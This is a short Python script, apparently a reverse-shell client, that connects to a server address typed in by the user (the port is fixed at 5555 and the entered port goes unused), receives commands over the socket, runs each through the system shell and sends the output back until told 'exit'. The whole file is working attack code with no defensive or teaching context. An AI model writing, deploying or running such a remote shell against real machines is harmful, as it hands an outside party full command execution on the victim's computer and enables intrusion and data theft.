import socket
import subprocess

# server ip address
ip_address = input("Enter the server ip address")

# server port number
port = input("Enter The port number")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((str(ip_address), int(5555)))


while True:
    command = s.recv(4096).decode('UTF-8')

    if command == 'exit':
        s.close()
        break

    CMD = subprocess.run(command, shell=True,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    s.send(CMD.stdout)
